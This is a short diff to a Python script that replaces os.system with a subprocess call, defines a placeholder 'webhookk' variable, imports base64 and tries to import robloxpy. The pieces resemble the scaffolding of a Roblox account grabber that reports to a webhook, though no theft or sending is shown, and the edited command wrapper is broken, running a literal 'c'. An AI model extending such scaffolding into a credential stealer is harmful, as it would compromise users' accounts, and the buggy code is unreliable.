@@ -1,13 +1,13 @@
-import os
+#!/usr/bin/env python
+
+import subprocess
 import codecs
 import json
 from base64 import *
 
 webhookk = "heh"
 def command(c):
-    os.system(c)
-def cls():
-    os.system("cls")
+    subprocess.run(['c', '&&', 'cls'], shell=True)
 
 try:
     import robloxpy
